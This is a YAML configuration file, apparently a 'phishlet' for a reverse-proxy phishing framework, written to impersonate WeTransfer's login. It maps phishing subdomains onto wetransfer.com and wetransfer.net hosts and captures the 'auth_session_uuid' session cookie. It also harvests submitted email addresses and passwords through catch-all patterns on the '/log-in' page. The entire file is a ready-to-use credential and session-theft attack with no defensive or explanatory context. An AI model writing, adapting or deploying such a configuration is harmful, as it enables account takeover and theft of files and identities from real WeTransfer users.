author: '@XC'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'wetransfer.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'snowplow', orig_sub: 'snowplow', domain: 'wetransfer.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'prod-cdn', orig_sub: 'prod-cdn', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'backgrounds', orig_sub: 'backgrounds', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'auth-cdn', orig_sub: 'auth-cdn', domain: 'wetransfer.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'auth-session-caching', orig_sub: 'auth-session-caching', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: true}

sub_filters: []
  
auth_tokens:
  - domain: '.wetransfer.com'
    keys: ['auth_session_uuid']
    
auth_urls:
  - '/account/callback'
  
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
    
    
login:
  domain: 'www.wetransfer.com'
  path: '/log-in'
